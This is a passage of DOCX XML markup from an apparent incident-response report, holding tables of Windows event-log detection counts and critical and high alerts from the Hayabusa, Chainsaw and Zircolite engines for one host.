          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>3926</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>informational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>1976</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>537</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>342</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>informational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>38</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Critical and high detections (to compare with the findings; a detection is not a finding until it has been qualified):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1361"/>
        <w:gridCol w:w="907"/>
        <w:gridCol w:w="737"/>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="624"/>
        <w:gridCol w:w="624"/>
        <w:gridCol w:w="1417"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>UTC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Engine</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Rule</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Host</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Channel</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>EventID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>RecordID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Reference</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-09 11:04:09.913000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Suspicious Service Path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>7045</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>178</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#6418</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-09 11:08:58.563000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>User Added To Local Admin Grp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sec</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4732</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>552</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5911</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-09 19:00:23.902000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>User Added To Local Admin Grp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sec</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4732</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>200</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5910</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:14:31.797000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Suspicious Service Path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>7045</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>287</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#6419</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:43.841000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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5891</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:43.841000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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5897</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:43.841943</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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#49</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:43.841943</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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#50</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:43.841943</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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#192</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708000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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5892</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
